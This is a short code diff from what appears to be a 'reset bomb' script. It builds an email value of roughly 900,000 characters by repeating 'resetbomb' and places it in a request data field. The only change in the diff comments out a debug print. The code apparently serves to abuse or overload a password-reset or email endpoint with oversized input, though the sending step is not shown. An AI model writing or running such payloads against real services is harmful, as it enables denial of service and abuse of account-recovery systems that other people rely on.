@@ -9,7 +9,7 @@ bigtext = ""
 #bigtext
 for i in range(99999):
     bigtext += "resetbomb"
-print(len(bigtext))
+# print(len(bigtext)) <- i forgot to comment this out earlier
 data = { # put data
     "email": f"{bigtext}@resetbomb.com"
 }
